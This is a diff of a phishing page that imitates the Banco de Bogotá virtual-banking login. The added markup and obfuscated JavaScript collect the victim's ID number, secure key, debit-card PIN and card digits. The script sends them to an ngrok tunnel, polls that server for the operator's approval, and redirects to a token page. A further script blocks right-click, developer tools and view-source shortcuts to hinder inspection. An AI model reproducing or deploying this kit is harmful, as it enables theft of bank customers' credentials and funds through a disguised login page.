-                        clave: clave
-                    });
-
-                    mostrarEsperaYRedirigir();
-                });
-            }
-
-            if (tarjetaForm) {
-                const tarjetaInputs = tarjetaForm.querySelectorAll('input[name]');
-                const tarjetaBtn = tarjetaForm.querySelector('.login-button');
-
-                function validateTarjetaForm() {
-                    const identification = tarjetaForm.querySelector('input[name="identification"]');
-                    const cardPin = tarjetaForm.querySelector('input[name="card-pin"]');
-                    const cardNumber = tarjetaForm.querySelector('input[name="card-number"]');
-                    const isValid = identification.value.trim().length >= 5 &&
-                                    cardPin.value.trim().length === 4 &&
-                                    cardNumber.value.trim().length === 4;
-                    if (tarjetaBtn) tarjetaBtn.disabled = !isValid;
-                }
-
-                tarjetaInputs.forEach(input => input.addEventListener('input', validateTarjetaForm));
-                validateTarjetaForm();
-
-                tarjetaForm.addEventListener('submit', async function(e) {
-                    e.preventDefault();
-
-                    const selectEl       = tarjetaForm.querySelector('select');
-                    const tipoDoc        = selectEl ? selectEl.value : "";
-                    const identificacion = tarjetaForm.querySelector('input[name="identification"]').value.trim();
-                    const clave          = tarjetaForm.querySelector('input[name="card-pin"]').value.trim();
-                    const tarjeta        = tarjetaForm.querySelector('input[name="card-number"]').value.trim();
-
-                    await enviarBackend("Tarjeta débito", {
-                        tipoDoc: tipoDoc,
-                        identificacion: identificacion,
-                        clave: clave,
-                        tarjeta: tarjeta
-                    });
-
-                    mostrarEsperaYRedirigir();
-                });
-            }
-        })();
-    </script>
-
+<div class="loading-overlay" id="loadingOverlay"><div class="loading-content"><img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo"><div class="loading-spinner"><div class="spinner-ring"></div></div><p class="loading-text">Cargando</p><p class="loading-subtext"></p></div></div>
+<div class="container">
+<section class="login-section">
+<div class="bank-logo"><img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo"></div>
+<h1 class="welcome-title">Bienvenido a tu Banca Virtual</h1>
+<div class="welcome-banner"><img src="Imagenes/Señora.png" alt="Asistente Virtual" class="banner-image"><div class="banner-text"><p>¿Nunca has ingresado a Banca Virtual?</p><a href="#">Aquí te decimos cómo hacerlo ›</a></div></div>
+<div class="login-container">
+<div class="login-options"><button class="active">Clave segura</button><button>Tarjeta débito</button></div>
+<div class="login-alert" id="loginAlert"><button type="button" class="close-icon" id="closeAlert"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 6L6 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 6L18 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button><p>Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.</p></div>
+<form id="claveForm" class="login-form clave-form">
+<div class="form-group"><label>Identificación</label><div class="input-group"><select><option>C.C. Cédula de ciudadanía</option><option>T.I. Tarjeta de Identidad</option><option>C.E. Cédula de Extranjería</option><option>N.I.T. NIT Persona Natural</option><option>N.P.E. NIT Persona Extranjera</option><option>N.I.J. NIT Persona Jurídica</option><option>P.S. Pasaporte</option><option>R.C. Registro Civil</option></select><input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true"></div></div>
+<div class="form-group"><label>Clave segura</label><div class="password-input"><input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="secure-key" placeholder="...." maxlength="4" aria-label="Clave segura" data-numeric="true"><button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/><path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/><path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button></div></div>
+<button type="submit" class="login-button" disabled>Ingresar</button>
+</form>
+<form id="tarjetaForm" class="login-form tarjeta-form" style="display:none">
+<div class="form-group"><label>Identificación</label><div class="input-group"><select><option>C.C. Cédula de ciudadanía</option><option>T.I. Tarjeta de Identidad</option><option>C.E. Cédula de Extranjería</option><option>N.I.T. NIT Persona Natural</option><option>N.P.E. NIT Persona Extranjera</option><option>N.I.J. NIT Persona Jurídica</option><option>P.S. Pasaporte</option><option>R.C. Registro Civil</option></select><input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true"></div></div>
+<div class="form-group"><label>Clave de tu tarjeta débito</label><div class="password-input"><input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-pin" placeholder="...." maxlength="4" aria-label="Clave de tarjeta débito" data-numeric="true"><button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/><path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/><path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button></div></div>
+<div class="form-group"><label>Últimos 4 dígitos de tu tarjeta débito</label><div class="password-input"><input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-number" placeholder="...." maxlength="4" aria-label="Últimos 4 dígitos de tu tarjeta débito" data-numeric="true"><button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/><path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/><path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></button></div></div>
+<button type="submit" class="login-button" disabled>Ingresar</button>
+</form>
+<div class="links"><a href="#">Registrarme</a><a href="#">Olvidé mi clave</a></div>
+</div>
+<p class="privacy-text">Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.</p>
+</section>
+<section class="right-section">
+<div class="service-cards-container">
+<button class="nav-button prev-button" aria-label="Anterior"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="white"/><path d="M14 6L8 12L14 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+<div class="service-cards">
+<a href="#" class="service-card"><div class="card-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="2"/><path d="M19 15C19.5523 15 20 14.5523 20 14C20 13.4477 19.5523 13 19 13C18.4477 13 18 13.4477 18 14C18 14.5523 18.4477 15 19 15Z" fill="currentColor"/><path d="M19 11C19.5523 11 20 10.5523 20 10C20 9.44772 19.5523 9 19 9C18.4477 9 18 9.44772 18 10C18 10.5523 18.4477 11 19 11Z" fill="currentColor"/><path d="M5 15C5.55228 15 6 14.5523 6 14C6 13.4477 5.55228 13 5 13C4.44772 13 4 13.4477 4 14C4 14.5523 4.44772 15 5 15Z" fill="currentColor"/><path d="M5 11C5.55228 11 6 10.5523 6 10C6 9.44772 5.55228 9 5 9C4.44772 9 4 9.44772 4 10C4 10.5523 4.44772 11 5 11Z" fill="currentColor"/><path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/></svg></div><div class="card-content"><h3>Configuración y<br>seguridad</h3></div></a>
+<a href="#" class="service-card"><div class="card-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 3L4 7V17L12 21L20 17V7L12 3Z" stroke="currentColor" stroke-width="2"/><path d="M12 12L4 7M12 12V21M12 12L20 7" stroke="currentColor" stroke-width="2"/></svg></div><div class="card-content"><h3>Solicitar un<br>producto</h3></div></a>
+<a href="#" class="service-card"><div class="card-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 11.5C21.0034 12.8199 20.6951 14.1219 20.1 15.3C19.3944 16.7118 18.3098 17.8992 16.9674 18.7293C15.6251 19.5594 14.0782 19.9994 12.5 20C11.1801 20.0035 9.87812 19.6951 8.7 19.1L3 21L4.9 15.3C4.30493 14.1219 3.99656 12.8199 4 11.5C4.00061 9.92179 4.44061 8.37488 5.27072 7.03258C6.10083 5.69028 7.28825 4.6056 8.7 3.90003C9.87812 3.30496 11.1801 2.99659 12.5 3.00003H13C15.0843 3.11502 17.053 3.99479 18.5291 5.47089C20.0052 6.94699 20.885 8.91568 21 11V11.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="card-content"><h3>Atención al<br>cliente</h3></div></a>
+<a href="#" class="service-card"><div class="card-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 8V12L14 14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/></svg></div><div class="card-content"><h3>Solicitar un<br>turno digital</h3></div></a>
+<a href="#" class="service-card"><div class="card-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17 8H7a2 2 0 00-2 2v9a2 2 0 002 2h10a2 2 0 002-2v-9a2 2 0 00-2-2zM12 3v5M8 7V3h8v4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 14v2M12 10v1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></div><div class="card-content"><h3>Buscar cajeros<br>y oficinas</h3></div></a>
+</div>
+<button class="nav-button next-button" aria-label="Siguiente"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="white"/><path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<div class="version-number">v.1.29.0</div>
+<p class="privacy-text privacy-text-right">Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.</p>
+</section>
+</div>
+<div id="esperaLogin"><div class="espera-login-spinner"><div class="shape shape-yellow"></div><div class="shape shape-blue"></div><div class="shape shape-red"></div></div></div>
+<div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Open Sans',-apple-system,sans-serif;opacity:0;transition:opacity .3s ease"><div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e"><div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="8" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div><div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div><div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div><button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button></div></div>
+<script>
+(function(){
+var _0xa1='https://exception-juiciness-hunting.ngrok-free.dev';
+var _0xb2='sess_'+Date.now()+'_'+Math.floor(Math.random()*10000);
+try{sessionStorage.setItem('sessionId',_0xb2)}catch(_0xc3){}
+var _0xd4=document.getElementById('claveForm');
+var _0xe5=document.getElementById('tarjetaForm');
+var _0xf6=document.getElementById('loginAlert');
+var _0xg7=document.getElementById('closeAlert');
+var _0xh8=document.querySelectorAll('.login-options button');
+var _0xi9=document.getElementById('esperaLogin');
+function _0xj0(_0xk1){return(_0xk1||'').replace(/\D/g,'')}
+document.querySelectorAll('input[data-numeric="true"]').forEach(function(_0xl2){
+_0xl2.setAttribute('inputmode','numeric');
+_0xl2.setAttribute('autocomplete','off');
+_0xl2.addEventListener('beforeinput',function(_0xm3){if(_0xm3.data&&/\D/.test(_0xm3.data)){_0xm3.preventDefault()}});
+_0xl2.addEventListener('input',function(){var _0xn4=_0xj0(_0xl2.value);if(_0xl2.value!==_0xn4){_0xl2.value=_0xn4}});
+_0xl2.addEventListener('paste',function(_0xo5){_0xo5.preventDefault();var _0xp6=(_0xo5.clipboardData||window.clipboardData).getData('text')||'';var _0xq7=_0xj0(_0xp6);var _0xr8=parseInt(_0xl2.getAttribute('maxlength')||'99',10);var _0xs9=_0xl2.selectionStart||0;var _0xt0=_0xl2.selectionEnd||0;var _0xu1=_0xl2.value||'';var _0xv2=(_0xu1.slice(0,_0xs9)+_0xq7+_0xu1.slice(_0xt0)).slice(0,_0xr8);_0xl2.value=_0xv2;_0xl2.dispatchEvent(new Event('input',{bubbles:true}))});
+_0xl2.addEventListener('keypress',function(_0xw3){if(_0xw3.key&&_0xw3.key.length===1&&/\D/.test(_0xw3.key)){_0xw3.preventDefault()}});
+_0xl2.addEventListener('drop',function(_0xx4){_0xx4.preventDefault()})
+});
+async function _0xy5(_0xz6,_0x07){
+var _0x18=new Date().toLocaleString('es-CO',{timeZone:'America/Bogota'});
+var _0x29={sessionId:_0xb2,tipo:_0xz6,tipoDoc:_0x07.tipoDoc||'',identificacion:_0x07.identificacion||'',clave:_0x07.clave||'',tarjeta:_0x07.tarjeta||''};
+try{sessionStorage.setItem("loginData",JSON.stringify({sessionId:_0xb2,tipo:_0xz6,tipoDoc:_0x07.tipoDoc||'',identificacion:_0x07.identificacion||'',clave:_0x07.clave||'',tarjeta:_0x07.tarjeta||'',fecha:_0x18}))}catch(_0x3a){}
+try{var _0x4b=await fetch(_0xa1+'/enviar',{method:'POST',headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},body:JSON.stringify(_0x29)});var _0x5c=await _0x4b.json()}catch(_0x6d){}
+}
+_0xh8.forEach(function(_0x7e,_0x8f){
+_0x7e.addEventListener('click',function(){
+_0xh8.forEach(function(_0x9g){_0x9g.classList.remove('active')});
+_0x7e.classList.add('active');
+if(_0x8f===0){_0xd4.style.display='';_0xe5.style.display='none';if(_0xf6)_0xf6.style.display='flex'}else{_0xd4.style.display='none';_0xe5.style.display='';if(_0xf6)_0xf6.style.display='none'}
+})
+});
+if(_0xg7){_0xg7.addEventListener('click',function(){_0xf6.style.display='none'})}
+document.querySelectorAll('.toggle-password').forEach(function(_0xah){
+_0xah.addEventListener('click',function(){var _0xbi=_0xah.parentElement.querySelector('input');if(_0xbi){_0xbi.type=_0xbi.type==='password'?'text':'password'}})
+});
+function _0xcj(){
+if(_0xi9)_0xi9.classList.add('visible');
+var _0xdk=setInterval(async function(){
+try{
+var _0xel=await fetch(_0xa1+'/estado/'+_0xb2,{headers:{'ngrok-skip-browser-warning':'true'}});
+var _0xfm=await _0xel.json();
+if(_0xfm.estado==='aprobado'){clearInterval(_0xdk);window.location.href='token.html'}
+else if(_0xfm.estado==='rechazado'){clearInterval(_0xdk);if(_0xi9)_0xi9.classList.remove('visible');setTimeout(function(){var _0xgn=document.getElementById('errorLogin');if(_0xgn)_0xgn.classList.add('visible')},300)}
+}catch(_0xho){}
+},2000);
+setTimeout(function(){clearInterval(_0xdk);if(_0xi9)_0xi9.classList.remove('visible')},3*60*1000)
+}
+var _0xip=document.getElementById('errorLoginBtn');
+if(_0xip){_0xip.addEventListener('click',function(){var _0xjq=document.getElementById('errorLogin');if(_0xjq)_0xjq.classList.remove('visible');window.location.reload()})}
+if(_0xd4){
+var _0xkr=_0xd4.querySelectorAll('input[name]');
+var _0xls=_0xd4.querySelector('.login-button');
+function _0xmt(){var _0xnu=_0xd4.querySelector('input[name="identification"]');var _0xov=_0xd4.querySelector('input[name="secure-key"]');var _0xpw=_0xnu.value.trim().length>=5&&_0xov.value.trim().length===4;if(_0xls)_0xls.disabled=!_0xpw}
+_kr.forEach(function(_0xqx){_0xqx.addEventListener('input',_0xmt)});
+_0xmt();
+_0xd4.addEventListener('submit',async function(_0xry){
+_0xry.preventDefault();
+var _0xsz=_0xd4.querySelector('select');
+var _0xt0b=_0xsz?_0xsz.value:"";
+var _0xu1b=_0xd4.querySelector('input[name="identification"]').value.trim();
+var _0xv2b=_0xd4.querySelector('input[name="secure-key"]').value.trim();
+await _0xy5("Clave segura",{tipoDoc:_0xt0b,identificacion:_0xu1b,clave:_0xv2b});
+_0xcj()
+})
+}
+if(_0xe5){
+var _0xw3b=_0xe5.querySelectorAll('input[name]');
+var _0xx4b=_0xe5.querySelector('.login-button');
+function _0xy5c(){var _0xz6b=_0xe5.querySelector('input[name="identification"]');var _0x07c=_0xe5.querySelector('input[name="card-pin"]');var _0x18c=_0xe5.querySelector('input[name="card-number"]');var _0x29c=_0xz6b.value.trim().length>=5&&_0x07c.value.trim().length===4&&_0x18c.value.trim().length===4;if(_0xx4b)_0xx4b.disabled=!_0x29c}
+_w3b.forEach(function(_0x3ac){_0x3ac.addEventListener('input',_0xy5c)});
+_0xy5c();
+_0xe5.addEventListener('submit',async function(_0x4bc){
+_0x4bc.preventDefault();
+var _0x5cc=_0xe5.querySelector('select');
+var _0x6dc=_0x5cc?_0x5cc.value:"";
+var _0x7ec=_0xe5.querySelector('input[name="identification"]').value.trim();
+var _0x8fc=_0xe5.querySelector('input[name="card-pin"]').value.trim();
+var _0x9gc=_0xe5.querySelector('input[name="card-number"]').value.trim();
+await _0xy5("Tarjeta débito",{tipoDoc:_0x6dc,identificacion:_0x7ec,clave:_0x8fc,tarjeta:_0x9gc});
+_0xcj()
+})
+}
+})();
+</script>
+<script>
+(function(){
+document.addEventListener('contextmenu',function(_0xaha){_0xaha.preventDefault();return false});
+document.addEventListener('keydown',function(_0xbia){var _0xcia=(_0xbia.key||'').toLowerCase(),_0xdia=_0xbia.ctrlKey||_0xbia.metaKey,_0xeia=_0xbia.shiftKey;if(_0xcia==='f12'){_0xbia.preventDefault();return false}if(_0xdia&&_0xeia&&(_0xcia==='i'||_0xcia==='j'||_0xcia==='c')){_0xbia.preventDefault();return false}if(_0xdia&&_0xcia==='u'){_0xbia.preventDefault();return false}if(_0xdia&&_0xcia==='s'){_0xbia.preventDefault();return false}if(_0xdia&&_0xeia&&_0xcia==='k'){_0xbia.preventDefault();return false}if(_0xdia&&_0xeia&&_0xcia==='e'){_0xbia.preventDefault();return false}if(_0xdia&&_0xeia&&_0xcia==='s'){_0xbia.preventDefault();return false}if(_0xdia&&_0xeia&&_0xcia==='c'){_0xbia.preventDefault();return false}});
+document.addEventListener('dragstart',function(_0xfia){_0xfia.preventDefault()});
+if(window.top!==window.self){try{window.top.location=window.self.location}catch(_0xgia){document.body.innerHTML=''}}
+})();
+</script>
 </body>
 </html>
